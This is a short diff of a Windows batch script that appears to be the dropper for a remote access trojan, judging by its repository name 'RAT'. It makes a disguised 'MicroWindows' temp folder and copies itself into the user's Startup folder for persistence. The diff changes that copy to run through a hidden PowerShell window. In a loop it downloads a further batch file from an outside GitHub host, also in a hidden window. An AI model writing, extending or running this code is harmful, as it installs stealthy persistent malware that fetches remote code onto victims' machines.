@@ -4,7 +4,7 @@ set "currentd=%cd%"
 mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
 set "targetd=C:\Users\%username%\AppData\Local\Temp\MicroWindows"
 cd %targetd%
-copy "%~f0" "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
+powershell -windowstyle hidden copy "%~f0" "C:\Users\saif\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\init.bat"
 
 :LOOP
 powershell powershell.exe  -windowstyle hidden "curl https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
